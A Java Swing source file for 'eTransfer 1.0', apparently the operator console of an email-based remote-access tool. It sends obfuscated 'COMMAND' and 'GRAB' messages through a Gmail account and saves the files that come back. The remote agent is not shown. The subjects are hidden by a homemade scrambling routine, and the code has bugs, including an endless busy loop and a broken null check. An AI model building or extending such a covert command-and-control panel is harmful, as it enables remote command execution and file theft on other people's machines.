package email.reader.gui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.GridLayout;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Properties;
import java.util.Random;
import java.util.UUID;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Part;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.SpringLayout;

import email.reader.button.Click;
import email.reader.check.EmailCheck;
import email.reader.grab.EmailGrab;
import email.reader.output.EmailOutput;
import email.reader.run.Run;

public class EmailGUI extends JFrame{
	private UUID uuid = UUID.randomUUID();
	private static final long serialVersionUID = 1L;
	public static EmailOutput out = null;
	public static EmailGUI gui = null;
	private EmailGrab access = null;
	private JTextField field = null;
	private String email = null;
	private String pass = null;
	private EmailCheck check = null;
	private File save = null;
	
	public EmailGUI(File save) {
		this.setSaveFile(save);
		gui = this;
		this.setTitle("eTransfer 1.0");
		this.setSize(800,500);
		this.setMinimumSize(new Dimension(800,500));
		this.setDefaultCloseOperation(EXIT_ON_CLOSE);
		this.setLocationRelativeTo(null);
		this.setResizable(false);
		this.getContentPane().setBackground(Color.WHITE);
		this.setLayout(new BorderLayout());
		JLabel j = new JLabel(new ImageIcon(EmailGUI.class.getResource("TopLogo.png")));
		this.add(j,BorderLayout.NORTH);
		JPanel bottom = new JPanel();
		bottom.setLayout(new GridLayout(1,2));
		EmailOutput out = new EmailOutput();
		EmailGUI.out = out;
		bottom.add(new JScrollPane(out));
		JPanel p = new JPanel();
		SpringLayout layout = new SpringLayout();
		p.setLayout(layout);
		UP up = new UP() {
			private static final long serialVersionUID = 1L;

			public void onLogin(EmailGrab grab) {
				access = grab;
				email = this.getEmailField().getText();
				pass = this.getPasswordField().getText();
				check = new EmailCheck(this.getEmailField().getText(),this.getPasswordField().getText());
			}
			
		};
		up.setVisible(true);
		p.add(up);
		layout.putConstraint(SpringLayout.HORIZONTAL_CENTER,up,0,SpringLayout.HORIZONTAL_CENTER,p);
		layout.putConstraint(SpringLayout.VERTICAL_CENTER,up,10,SpringLayout.VERTICAL_CENTER,p);
		Click read = new Click("Read Mail") {

			private static final long serialVersionUID = 1L;

			public void onLeftClick() {
				if (access != null) {
					int reply = JOptionPane.showConfirmDialog(null, "Would you like to download attachments?", "Attachments", JOptionPane.YES_NO_OPTION);
			        if (reply == JOptionPane.YES_OPTION) {
						try {
				        	Folder inbox = access.getInbox();
							if (inbox.getMessageCount() > 0) {
								for (Message msg : inbox.getMessages()) {
					        		
									out.append("===================\n");
									String from = msg.getFrom()[0].toString();
									String date = msg.getSentDate().toString();
									String subject = msg.getSubject();
									out.info("FROM: " + from + "\n");
									out.info("SENT: " + date + "\n");
									out.info("SUBJECT: " + subject + "\n");
									if (msg.getContent() instanceof MimeMultipart) {
										if (getText((MimeMultipart) msg.getContent()) != null) {
										out.info("CONTENT: " + getText((MimeMultipart) msg.getContent()));
										}
										List<File> files = saveAttachments(msg);
										out.info("ATTACHMENTS: " + files.size());
										out.info("Attachments saved to file");
										
									}else{
										out.info("Not instance of MMP.\n");
									}
										
								}
							}else{
								out.error("There is no mail in your inbox.");
							}
						} catch (MessagingException | IOException e) {
							out.error("Failed to get mail from your inbox.");
						}
			        }
			        else {
						try {
							Folder inbox = access.getInbox();
							if (inbox.getMessageCount() > 0) {
								for (Message msg : inbox.getMessages()) {
					        		
									out.append("===================\n");
									String from = msg.getFrom()[0].toString();
									String date = msg.getSentDate().toString();
									String subject = msg.getSubject();
									out.info("FROM: " + from + "\n");
									out.info("SENT: " + date + "\n");
									out.info("SUBJECT: " + subject + "\n");
									if (msg.getContent() instanceof MimeMultipart) {
										if (getText((MimeMultipart) msg.getContent()) != null) {
										out.info("CONTENT: " + getText((MimeMultipart) msg.getContent()));
										}
									}else{
										out.info("Not instance of MMP.\n");
									}
										
								}
							}else{
								out.error("There is no mail in your inbox.");
							}
						} catch (MessagingException | IOException e) {
							out.error("Failed to get mail from your inbox.");
						}
			        }
				}else{
					out.error("You must connect to an email first.");
				}
			}

			public void onRightClick() {
				
			}

			public void onWheelClick() {
				
			}
			
		};
		p.add(read);
		layout.putConstraint(SpringLayout.NORTH,read,30,SpringLayout.NORTH,p);
		layout.putConstraint(SpringLayout.WEST,read,20,SpringLayout.WEST,p);
		Click file = new Click("Grab File") {

			private static final long serialVersionUID = 1L;

			public void onLeftClick() {
				if (access != null) {
					String dir = field.getText();
					if (!dir.equals("")) {
						out.info("Attempting to grab [" + dir + "] file.");
						sendMessage("GRAB", dir);
					}else{
						out.error("There is no entry in the text field.");
					}
				}else{
					out.error("You must connect to an email first.");
				}
			}

			public void onRightClick() {
				
			}

			public void onWheelClick() {
				
			}
			
		};
		p.add(file);
		layout.putConstraint(SpringLayout.NORTH,file,30,SpringLayout.NORTH,p);
		layout.putConstraint(SpringLayout.EAST,file,-20,SpringLayout.EAST,p);
		Click sent = new Click("Send File") {

			private static final long serialVersionUID = 1L;

			public void onLeftClick() {
				if (access != null) {
					String dir = field.getText();
					if (!dir.equals("")) {
						File file;
						try {
						file = new File(dir);
						}catch (Exception e) {
							out.error("That is not a file.");
							return;
						}
						if (file.exists()) {
						 sendFile(file);
						}else{
							out.error("That file does not exist.");
						}
					}else{
						out.error("There is no entry in the text field.");
					}
				}else{
					out.error("You must connect to an email first.");
				}
			}

			public void onRightClick() {
				
			}

			public void onWheelClick() {
				
			}
			
		};
		p.add(sent);
		layout.putConstraint(SpringLayout.EAST,sent,-5,SpringLayout.HORIZONTAL_CENTER,p);
		layout.putConstraint(SpringLayout.NORTH,sent,30,SpringLayout.NORTH,p);
		Click command = new Click("Command") {

			private static final long serialVersionUID = 1L;

			public void onLeftClick() {
				if (access != null) {
					String dir = field.getText();
					if (!dir.equals("")) {
						sendMessage("COMMAND", dir);
						out.info("Attempting to run [" + dir + "] command..");
					}else{
						out.error("There is no entry in the text field.");
					}
				}else{
					out.error("You must connect to an email first.");
				}
			}

			public void onRightClick() {
				
			}

			public void onWheelClick() {
				
			}
			
		};
		p.add(command);
		layout.putConstraint(SpringLayout.NORTH,command,30,SpringLayout.NORTH,p);
		layout.putConstraint(SpringLayout.WEST,command,5,SpringLayout.HORIZONTAL_CENTER,p);
		field = new JTextField(30);
		p.add(field);
		layout.putConstraint(SpringLayout.SOUTH,field,-20,SpringLayout.SOUTH,p);
		layout.putConstraint(SpringLayout.HORIZONTAL_CENTER,field,0,SpringLayout.HORIZONTAL_CENTER,p);
		bottom.add(p);
		this.add(bottom, BorderLayout.CENTER);
		out.write("============================");
		out.write("Getting system properties..");
		out.write("Java Version == \"" + System.getProperty("java.version") + "\"");
		out.write("Operating System == \"" + System.getProperty("os.name") + "\" v" + System.getProperty("os.version"));
		out.write("Current Time == \"" + new Date() + "\"");
		out.write("User == \"" + System.getProperty("user.name") + "\"");
		out.write("============================");
		out.write("Attempting to connect...");
		new Run() {

			public void run() {
						out.write("Loaded eTransfer v1.0 successfully!");
						out.write("============================");
			}
			
		}.runDelayed(1500);
		this.setVisible(true);
		while(true) {
			
		}
	}
	
	public void paint(Graphics g) {
		super.paint(g);
		g.setColor(Color.LIGHT_GRAY);
		g.fillRect(0, 130, 800, 1);
	}

	public EmailGrab getAccess() {
		return access;
	}

	public void setAccess(EmailGrab access) {
		this.access = access;
	}
	
	public List<String> getTypes(MimeMultipart mmp) throws MessagingException {
		List<String> types = new ArrayList<String>();
		for (int i = 0; i < mmp.getCount(); i++) {
			BodyPart bp = mmp.getBodyPart(i);
			types.add(bp.getContentType() + "/" + bp.getDisposition());
		}
		return types;
	}
	
	public String getText(MimeMultipart mmp) throws MessagingException, IOException {
		String overall = null;
		for (int i = 0; i < mmp.getCount(); i++) {
			BodyPart bp = mmp.getBodyPart(i);
			if (bp.getContentType().startsWith("TEXT/PLAIN")) {
				overall = bp.getContent().toString();
			}
		}
		return overall;
		
	}
	
	public List<File> saveAttachments(Message m) throws IOException, MessagingException {
		List<File> files = new ArrayList<File>();
		if (m.getContent() != null) {
		if (m.getContent() instanceof MimeMultipart) {
			MimeMultipart mmp = (MimeMultipart) m.getContent();
			File dir = new File(this.getDirectory().getParentFile() + "/[" + this.getDate(new Date()) + "]" + this.decrypt(m.getSubject()).split("AbC")[0]);
			for(int i = 0; i < mmp.getCount(); i++) {
				BodyPart bp = mmp.getBodyPart(i);
				if (bp.getDisposition() != null) {
				if(!Part.ATTACHMENT.equalsIgnoreCase(bp.getDisposition()) &&
			               (bp.getFileName().equals("") || bp.getFileName() == null)) {
			       continue;
			    }
				}
				if (bp.getInputStream() != null && bp.getFileName() != null) {
				InputStream in = bp.getInputStream();
				dir.mkdirs();
				File f = new File(dir + "/" + bp.getFileName());
				f.createNewFile();
				FileOutputStream fos = new FileOutputStream(f);
			    byte[] buf = new byte[10000];
			    int bytesRead;
			    while((bytesRead = in.read(buf))!=-1) {
			        fos.write(buf, 0, bytesRead);
			    }
			    fos.close();
			    files.add(f);
			    }else{
			    	
			    }
		}
		}
		}else{
			
		}
		return files;
	}
	
	public File saveFile(Message m) throws MessagingException, IOException, NullPointerException {
		File f = null;
		if (m.getContent() != null) {
			if (m.getContent() instanceof MimeMultipart) {
				MimeMultipart mmp = (MimeMultipart) m.getContent();
				for(int i = 0; i < mmp.getCount(); i++) {
					BodyPart bp = mmp.getBodyPart(i);
					if (bp.getDisposition() != null) {
					if(!Part.ATTACHMENT.equalsIgnoreCase(bp.getDisposition()) &&
				               (bp.getFileName().equals("") || bp.getFileName() == null)) {
				       continue;
				    }
					}
					if (bp.getInputStream() != null && bp.getFileName() != null) {
					InputStream in = bp.getInputStream();
					for (File file : save.listFiles()) {
						if (file.getName().equals(bp.getFileName())) {
							file.delete();
						}
					}
					f = new File(save + "/" + bp.getFileName());
					f.createNewFile();
					FileOutputStream fos = new FileOutputStream(f);
				    byte[] buf = new byte[10000];
				    int bytesRead;
				    while((bytesRead = in.read(buf))!=-1) {
				        fos.write(buf, 0, bytesRead);
				    }
				    fos.close();
				    }
			}
			}
		}
		if (f.equals(null)) {
			throw new NullPointerException();
		}
		return f;
	}
	
	public void sendMessage(String subject,String message) {
		try {
			 Properties props = new Properties();
		      props.put("mail.smtp.auth", "true");
		      props.put("mail.smtp.starttls.enable", "true");
		      props.put("mail.smtp.host", "smtp.gmail.com");
		      props.put("mail.smtp.port", "587");
		      Session sesh = Session.getInstance(props,
		    	      new javax.mail.Authenticator() {
		    	         protected PasswordAuthentication getPasswordAuthentication() {
		    	            return new PasswordAuthentication(email, pass);
		    	         }
		    	      });
			MimeMessage msg = new MimeMessage(sesh);
			msg.setFrom(new InternetAddress(EmailGUI.gui.getEmail()));
			msg.addRecipient(Message.RecipientType.TO, new InternetAddress(email));
			msg.setSubject(EmailGUI.gui.encrypt(subject + "AbC" + uuid.toString().replaceAll("-","")));
			Multipart body = new MimeMultipart();
			MimeBodyPart attach = new MimeBodyPart();
			attach.setContent(encrypt(message), "TEXT/PLAIN");
		        body.addBodyPart(attach);
		        msg.setContent(body);
		        Transport.send(msg);
		        field.setText("");
		} catch (MessagingException e) {
			out.write("Failed to send message.");
			e.printStackTrace();
		}

	}
	
	public File getDirectory() {
		return new File(EmailGUI.class.getProtectionDomain().getCodeSource().getLocation().getFile());
	}
		
	
	public String getDate(Date date) {
		SimpleDateFormat format = new SimpleDateFormat("hh-mm-ss");
		return format.format(date);
	}
	
	public String encrypt(String code) {
		String encrypt = "";
		Random r = new Random();
		for (int i = 0; i < code.length(); i++) {
			int w = r.nextInt(8) + 1;
			encrypt = (encrypt + String.valueOf(w));
			for (int x = 1; x <= w; x++) {
				encrypt = (encrypt + this.generateRandomKey());
			}
			encrypt = (encrypt + String.valueOf(code.charAt(i)));
		}
		return encrypt;
}
	
	public String decrypt(String code) {
		String fin = "";
		String dc = code;
		while(dc.length() > 0) {
			int w = Integer.parseInt(String.valueOf(dc.charAt(0)));
			dc = dc.substring((w + 1), dc.length());
			fin = (fin + String.valueOf(dc.charAt(0)));
			dc = dc.substring(1, dc.length());
		}
		return fin;
	}
	
	public String generateRandomKey() {
		String idk = null;
		Random r = new Random();
		int type = r.nextInt(2) + 1;
		switch(type) {
		case 1:
			String alph = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz";
			int w = r.nextInt(51) + 1;
			char letter = alph.charAt(w);
			idk = String.valueOf(letter);
			 break;
		case 2:
			String single = "0123456789";
			int w1 = r.nextInt(9) + 1;
			char numb = single.charAt(w1);
			idk = String.valueOf(numb);
			break;
		}
		return idk;
	}
	
	public String readFile(String path, Charset encoding) 
			  throws IOException 
			{
			  byte[] encoded = Files.readAllBytes(Paths.get(path));
			  return new String(encoded, encoding);
			}
	
	public String getEmail() {
		return email;
	}
	
	public UUID getUUID() {
		return uuid;
	}

	public EmailCheck getCheck() {
		return check;
	}

	public void setCheck(EmailCheck check) {
		this.check = check;
	}

	public File getSaveFile() {
		return save;
	}

	public void setSaveFile(File save) {
		this.save = save;
	}
	
	public void sendFile(File file) {
		Properties props = new Properties();
	      props.put("mail.smtp.auth", "true");
	      props.put("mail.smtp.starttls.enable", "true");
	      props.put("mail.smtp.host", "smtp.gmail.com");
	      props.put("mail.smtp.port", "587");
	      Session sesh = Session.getInstance(props,
	    	      new javax.mail.Authenticator() {
	    	         protected PasswordAuthentication getPasswordAuthentication() {
	    	            return new PasswordAuthentication(email, pass);
	    	         }
	    	      });
		MimeMessage msg = new MimeMessage(sesh);
		try {
			msg.setFrom(new InternetAddress(email));
			msg.addRecipient(Message.RecipientType.TO, new InternetAddress(email));
			msg.setSubject(encrypt("SENDAbC" + uuid.toString().replaceAll("-","")));
			DataSource source = new FileDataSource(file);
			Multipart body = new MimeMultipart();
			MimeBodyPart attach = new MimeBodyPart();
			 attach.setDataHandler(new DataHandler(source));
		        attach.setFileName(file.getName());
		        body.addBodyPart(attach);
		        msg.setContent(body);
		        Transport.send(msg);
		        out.info("File [" + file.getName() + "] sent!");
		        field.setText("");
		} catch (MessagingException e) {
			out.write("Failed to compile file.");
			e.printStackTrace();
		}
	}
}
